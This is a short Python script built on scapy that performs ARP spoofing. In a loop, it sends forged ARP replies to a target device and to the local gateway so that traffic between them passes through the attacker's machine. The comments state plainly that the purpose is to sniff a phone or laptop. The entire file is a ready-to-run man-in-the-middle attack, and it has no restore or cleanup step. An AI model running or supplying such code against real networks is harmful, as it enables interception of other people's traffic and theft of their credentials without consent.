from scapy.all import Ether, ARP, send, srp
import time
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

def spoof(target_ip, host_ip):
    # Craft the 'is-at' packet
    packet = ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=host_ip)
    send(packet, verbose=False)

target = "10.6.21.47"  # The IP of the phone/laptop you want to sniff
gateway = "10.6.0.1"   # Your Router's IP

print("[+] Starting Spoof...")
try:
    while True:
        spoof(target, gateway)  # Tell target I am the router
        spoof(gateway, target)  # Tell router I am the target
        time.sleep(2)
except KeyboardInterrupt:
    print("[!] Stopping...")